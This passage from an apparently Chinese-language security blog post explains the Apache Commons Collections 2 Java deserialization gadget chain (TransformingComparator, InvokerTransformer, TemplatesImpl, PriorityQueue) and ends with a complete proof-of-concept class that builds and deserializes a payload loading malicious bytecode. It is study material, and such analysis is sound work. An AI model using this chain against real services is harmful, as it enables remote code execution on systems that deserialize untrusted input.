+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TransformingComparator</span>&lt;<span class="title">I</span>, <span class="title">O</span>&gt; <span class="keyword">implements</span> <span class="title">Comparator</span>&lt;<span class="title">I</span>&gt;, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> Transformer&lt;? <span class="keyword">super</span> I, ? extends O&gt; transformer;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">TransformingComparator</span><span class="params">(<span class="keyword">final</span> Transformer&lt;? <span class="keyword">super</span> I, ? extends O&gt; transformer,<span class="keyword">final</span> Comparator&lt;O&gt; decorated)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.decorated = decorated;</span><br><span class="line">		<span class="keyword">this</span>.transformer = transformer;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(<span class="keyword">final</span> I obj1, <span class="keyword">final</span> I obj2)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">final</span> O value1 = <span class="keyword">this</span>.transformer.transform(obj1);</span><br><span class="line">		<span class="keyword">final</span> O value2 = <span class="keyword">this</span>.transformer.transform(obj2);</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">this</span>.decorated.compare(value1, value2);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>compare方法调用了transformer.transform()，transformer可控，那么将InvokerTransformer传递给transformer就会调用InvokerTransformer.transform()。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InvocationTargetException, ClassNotFoundException, InstantiationException, TransformerConfigurationException </span>&#123;</span><br><span class="line">    <span class="comment">//获取一个TemplatesImpl对象</span></span><br><span class="line">    TemplatesImpl templates = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">    <span class="comment">//读取恶意代码的字节码</span></span><br><span class="line">    <span class="keyword">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;C:/Users/self_209/Desktop/CodeImplement.class&quot;</span>));</span><br><span class="line">    <span class="comment">//将字节码数组存放在二维数组中</span></span><br><span class="line">    <span class="keyword">byte</span>[][] _bytecodes = &#123;code&#125;;</span><br><span class="line">    <span class="comment">//获取TemplatesImpl的Class对象</span></span><br><span class="line">    Class c = templates.getClass();</span><br><span class="line">    <span class="comment">//获取_name属性</span></span><br><span class="line">    Field name = c.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">    name.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    <span class="comment">//将_name设置为任意</span></span><br><span class="line">    name.set(templates,<span class="string">&quot;ok&quot;</span>);</span><br><span class="line">    <span class="comment">//获取_bytecodes属性</span></span><br><span class="line">    Field bytecodes = c.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">    bytecodes.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    <span class="comment">//将存放恶意代码字节码的二维数组传递给_bytecodes属性</span></span><br><span class="line">    bytecodes.set(templates,_bytecodes);</span><br><span class="line">    <span class="comment">//获取_tfactory属性，这里只是为了演示所以手动加上这个属性，它被transient修饰不会被序列化，所以他在readObject反序列化的时候被赋值。</span></span><br><span class="line">    Field tfactory = c.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">    tfactory.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    tfactory.set(templates,<span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    InvokerTransformer newTransformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">    <span class="keyword">new</span> TransformingComparator(newTransformer).compare(templates,<span class="string">&quot;templates&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>运行代码：</p>
+<p><img src="image-20220101163923719.png" alt="image-20220101163923719"></p>
+<h3 id="PriorityQueue"><a href="#PriorityQueue" class="headerlink" title="PriorityQueue"></a>PriorityQueue</h3><p>之后便是找什么地方调用了compare方法，来到PriorityQueue类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PriorityQueue</span>&lt;<span class="title">E</span>&gt; <span class="keyword">extends</span> <span class="title">AbstractQueue</span>&lt;<span class="title">E</span>&gt; <span class="keyword">implements</span> <span class="title">java</span>.<span class="title">io</span>.<span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> Comparator&lt;? <span class="keyword">super</span> E&gt; comparator;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> size = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">offer</span><span class="params">(E e)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (e == <span class="keyword">null</span>)</span><br><span class="line">			<span class="keyword">throw</span> <span class="keyword">new</span> NullPointerException();</span><br><span class="line">		modCount++;</span><br><span class="line">		<span class="keyword">int</span> i = size;</span><br><span class="line">		<span class="keyword">if</span> (i &gt;= queue.length)</span><br><span class="line">			grow(i + <span class="number">1</span>);</span><br><span class="line">		size = i + <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">if</span> (i == <span class="number">0</span>)</span><br><span class="line">			queue[<span class="number">0</span>] = e;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			siftUp(i, e);</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">PriorityQueue</span><span class="params">(<span class="keyword">int</span> initialCapacity,Comparator&lt;? <span class="keyword">super</span> E&gt; comparator)</span> </span>&#123;</span><br><span class="line">		<span class="comment">// Note: This restriction of at least one is not actually needed,</span></span><br><span class="line">		<span class="comment">// but continues for 1.5 compatibility</span></span><br><span class="line">		<span class="keyword">if</span> (initialCapacity &lt; <span class="number">1</span>)</span><br><span class="line">			<span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException();</span><br><span class="line">		<span class="keyword">this</span>.queue = <span class="keyword">new</span> Object[initialCapacity];</span><br><span class="line">		<span class="keyword">this</span>.comparator = comparator;</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">siftDownUsingComparator</span><span class="params">(<span class="keyword">int</span> k, E x)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> half = size &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">while</span> (k &lt; half) &#123;</span><br><span class="line">			<span class="keyword">int</span> child = (k &lt;&lt; <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">			Object c = queue[child];</span><br><span class="line">			<span class="keyword">int</span> right = child + <span class="number">1</span>;</span><br><span class="line">			<span class="keyword">if</span> (right &lt; size &amp;&amp;</span><br><span class="line">				comparator.compare((E) c, (E) queue[right]) &gt; <span class="number">0</span>)</span><br><span class="line">				c = queue[child = right];</span><br><span class="line">			<span class="keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="number">0</span>)</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			queue[k] = c;</span><br><span class="line">			k = child;</span><br><span class="line">		&#125;</span><br><span class="line">		queue[k] = x;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">siftDown</span><span class="params">(<span class="keyword">int</span> k, E x)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (comparator != <span class="keyword">null</span>)</span><br><span class="line">			siftDownUsingComparator(k, x);</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			siftDownComparable(k, x);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">heapify</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = (size &gt;&gt;&gt; <span class="number">1</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">			siftDown(i, (E) queue[i]);</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>siftDownUsingComparator方法调用了comparator.compare(x, (E) c)，comparator可控，那么我们找在哪调用了siftDownUsingComparator方法，发现siftDown方法调用了参数x可控，那么我们找在哪调用了siftDown方法，发现在heapify方法中调用了，并且把queue[i]传递给x，那我们就要看怎么把templates赋值到queue。在offer方法当i == 0就可以把templates赋值到queue，但是当i不等于0时就会调用siftUp方法，会触发我们的调用链，所以为了它在调用offer方法的时候不触发调用链，我们在调用offer前不把InvokerTransformer类的对象传递到TransformingComparator类的transformer属性中，利用反射在templates赋值到queue之后，再把InvokerTransformer类的对象传递到TransformingComparator类的transformer属性中。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取一个TemplatesImpl对象</span></span><br><span class="line">        TemplatesImpl templates = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        <span class="comment">//读取恶意代码的字节码</span></span><br><span class="line">        <span class="keyword">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;C:/Users/self_209/Desktop/CodeImplement.class&quot;</span>));</span><br><span class="line">        <span class="comment">//将字节码数组存放在二维数组中</span></span><br><span class="line">        <span class="keyword">byte</span>[][] _bytecodes = &#123;code&#125;;</span><br><span class="line">        <span class="comment">//获取TemplatesImpl的Class对象</span></span><br><span class="line">        Class c = templates.getClass();</span><br><span class="line">        <span class="comment">//获取_name属性</span></span><br><span class="line">        Field name = c.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">//将_name设置为任意</span></span><br><span class="line">        name.set(templates, <span class="string">&quot;ok&quot;</span>);</span><br><span class="line">        <span class="comment">//获取_bytecodes属性</span></span><br><span class="line">        Field bytecodes = c.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">//将存放恶意代码字节码的二维数组传递给_bytecodes属性</span></span><br><span class="line">        bytecodes.set(templates, _bytecodes);</span><br><span class="line">        <span class="comment">//获取_tfactory属性，这里只是为了演示所以手动加上这个属性，它被transient修饰不会被序列化，所以他在readObject反序列化的时候被赋值。</span></span><br><span class="line">        Field tfactory = c.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        tfactory.set(templates, <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">//利用InvokerTransformer类获取newTransformer方法。</span></span><br><span class="line">        InvokerTransformer newTransformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">		<span class="comment">//在调用offer前不把InvokerTransformer类的对象传递到TransformingComparator类的transformer属性中</span></span><br><span class="line">        TransformingComparator transformingComparator = <span class="keyword">new</span> TransformingComparator(<span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">		<span class="comment">//new 一个PriorityQueue对象将transformingComparator传递给comparator属性</span></span><br><span class="line">        PriorityQueue&lt;Object&gt; priorityQueue = <span class="keyword">new</span> PriorityQueue&lt;&gt;(transformingComparator);</span><br><span class="line">        priorityQueue.offer(templates);</span><br><span class="line">        priorityQueue.offer(templates);</span><br><span class="line">		<span class="comment">//把InvokerTransformer类的对象传递到TransformingComparator类的transformer属性中</span></span><br><span class="line">        Class&lt;? extends TransformingComparator&gt; aClass = transformingComparator.getClass();</span><br><span class="line">        Field transformer = aClass.getDeclaredField(<span class="string">&quot;transformer&quot;</span>);</span><br><span class="line">        transformer.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        transformer.set(transformingComparator,newTransformer);</span><br></pre></td></tr></table></figure>
+
+<p>PriorityQueue.readObject()</p>
+<p>在PriorityQueue.readObject方法中调用了heapify方法，所以在priorityQueue对象反序列化时就会调用heapify方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span></span></span><br><span class="line"><span class="params"><span class="function">		// Read in size, and any hidden stuff</span></span></span><br><span class="line"><span class="params"><span class="function">		s.defaultReadObject()</span></span>;</span><br><span class="line">		<span class="comment">// Read in (and discard) array length</span></span><br><span class="line">		s.readInt();</span><br><span class="line">		queue = <span class="keyword">new</span> Object[size];</span><br><span class="line">		<span class="comment">// Read in all elements.</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">			queue[i] = s.readObject();</span><br><span class="line">		<span class="comment">// Elements are guaranteed to be in &quot;proper order&quot;, but the</span></span><br><span class="line">		<span class="comment">// spec has never explained what that might be.</span></span><br><span class="line">		heapify();</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<p>poc:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Transformer;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.TransformerConfigurationException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Comparator;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">cc2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;priorityQueue.txt&quot;</span>));</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">unSerialize</span><span class="params">(String FileName)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(FileName));</span><br><span class="line">        <span class="keyword">return</span> ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InvocationTargetException, ClassNotFoundException, InstantiationException, TransformerConfigurationException </span>&#123;</span><br><span class="line">        <span class="comment">//获取一个TemplatesImpl对象</span></span><br><span class="line">        TemplatesImpl templates = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        <span class="comment">//读取恶意代码的字节码</span></span><br><span class="line">        <span class="keyword">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;C:/Users/self_209/Desktop/CodeImplement.class&quot;</span>));</span><br><span class="line">        <span class="comment">//将字节码数组存放在二维数组中</span></span><br><span class="line">        <span class="keyword">byte</span>[][] _bytecodes = &#123;code&#125;;</span><br><span class="line">        <span class="comment">//获取TemplatesImpl的Class对象</span></span><br><span class="line">        Class c = templates.getClass();</span><br><span class="line">        <span class="comment">//获取_name属性</span></span><br><span class="line">        Field name = c.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">//将_name设置为任意</span></span><br><span class="line">        name.set(templates, <span class="string">&quot;ok&quot;</span>);</span><br><span class="line">        <span class="comment">//获取_bytecodes属性</span></span><br><span class="line">        Field bytecodes = c.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">//将存放恶意代码字节码的二维数组传递给_bytecodes属性</span></span><br><span class="line">        bytecodes.set(templates, _bytecodes);</span><br><span class="line">        <span class="comment">//获取_tfactory属性，这里只是为了演示所以手动加上这个属性，它被transient修饰不会被序列化，所以他在readObject反序列化的时候被赋值。</span></span><br><span class="line">        Field tfactory = c.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        tfactory.set(templates, <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        InvokerTransformer newTransformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">        TransformingComparator transformingComparator = <span class="keyword">new</span> TransformingComparator(<span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        PriorityQueue&lt;Object&gt; priorityQueue = <span class="keyword">new</span> PriorityQueue&lt;&gt;(transformingComparator);</span><br><span class="line">        priorityQueue.offer(templates);</span><br><span class="line">        priorityQueue.offer(templates);</span><br><span class="line"></span><br><span class="line">        Class&lt;? extends TransformingComparator&gt; aClass = transformingComparator.getClass();</span><br><span class="line">        Field transformer = aClass.getDeclaredField(<span class="string">&quot;transformer&quot;</span>);</span><br><span class="line">        transformer.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        transformer.set(transformingComparator,newTransformer);</span><br><span class="line">		</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//Serialize(priorityQueue);</span></span><br><span class="line">        unSerialize(<span class="string">&quot;priorityQueue.txt&quot;</span>)</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>反序列化：</p>
+<p><img src="image-20220101171545700.png" alt="image-20220101171545700"></p>
+
+            
+
+
+        </div>
+    </div>
+    <div id="post-footer" class="post-footer main-content-wrap">
+        
+            <div class="post-footer-tags">
+                <span class="text-color-light text-small">标签</span><br/>
+                
+    <a class="tag tag--primary tag--small t-none-link" href="/tags/java/" rel="tag">java</a> <a class="tag tag--primary tag--small t-none-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a>
+
+            </div>
+        
+        
+            <div class="post-actions-wrap">
+    <nav>
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+                
+                    <a
+                        class="post-action-btn btn btn--disabled"
+                        aria-hidden="true"
+                    >
+                        
+                        <i class="fa fa-angle-left" aria-hidden="true"></i>
+                        <span class="hide-xs hide-sm text-small icon-ml">上一篇</span>
+                    </a>
+            </li>
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/2021/12/28/20211228/"
+                    data-tooltip="java反序列化Commons Collections(一)"
+                    aria-label="下一篇: java反序列化Commons Collections(一)"
+                >
+                    
+                        <span class="hide-xs hide-sm text-small icon-mr">下一篇</span>
+                        <i class="fa fa-angle-right" aria-hidden="true"></i>
+                    </a>
+            </li>
+        </ul>
+    </nav>
+    <ul class="post-actions post-action-share">
+        <li class="post-action hide-lg hide-md hide-sm">
+            <a
+                class="post-action-btn btn btn--default btn-open-shareoptions"
+                href="#btn-open-shareoptions"
+                aria-label="Diesen Beitrag teilen"
+            >
+                <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </a>
+        </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://twitter.com/intent/tweet?text=https://self209.github.io/2021/12/29/20211229/"
+                    title="分享到 Twitter"
+                    aria-label="分享到 Twitter"
+                >
+                    <i class="fab fa-twitter" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://plus.google.com/share?url=https://self209.github.io/2021/12/29/20211229/"
+                    title="分享到 Google+"
+                    aria-label="分享到 Google+"
+                >
+                    <i class="fab fa-google-plus" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="http://connect.qq.com/widget/shareqq/index.html?url=https://self209.github.io/2021/12/29/20211229/&amp;title=java反序列化Commons Collections(二)"
+                    title="分享到 QQ"
+                    aria-label="分享到 QQ"
+                >
+                    <i class="fab fa-qq" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+        
+        <li class="post-action">
+            
+                <a class="post-action-btn btn btn--default" href="#table-of-contents" aria-label="目录">
+            
+                <i class="fa fa-list" aria-hidden="true"></i>
+            </a>
+        </li>
+    </ul>
+</div>
+
+
+        
+        
+    </div>
+</article>
+
+
+
+                <footer id="footer" class="main-content-wrap">
+    <span class="copyrights">
+        Copyrights &copy; 2022 self_209. All Rights Reserved.
+    </span>
+</footer>
+
+            </div>
+            
+                <div id="bottom-bar" class="post-bottom-bar" data-behavior="5">
+                    <div class="post-actions-wrap">
+    <nav>
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+                
+                    <a
+                        class="post-action-btn btn btn--disabled"
+                        aria-hidden="true"
+                    >
+                        
+                        <i class="fa fa-angle-left" aria-hidden="true"></i>
+                        <span class="hide-xs hide-sm text-small icon-ml">上一篇</span>
+                    </a>
+            </li>
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/2021/12/28/20211228/"
+                    data-tooltip="java反序列化Commons Collections(一)"
+                    aria-label="下一篇: java反序列化Commons Collections(一)"
+                >
+                    
+                        <span class="hide-xs hide-sm text-small icon-mr">下一篇</span>
+                        <i class="fa fa-angle-right" aria-hidden="true"></i>
+                    </a>
+            </li>
+        </ul>
+    </nav>
+    <ul class="post-actions post-action-share">
+        <li class="post-action hide-lg hide-md hide-sm">
+            <a
+                class="post-action-btn btn btn--default btn-open-shareoptions"
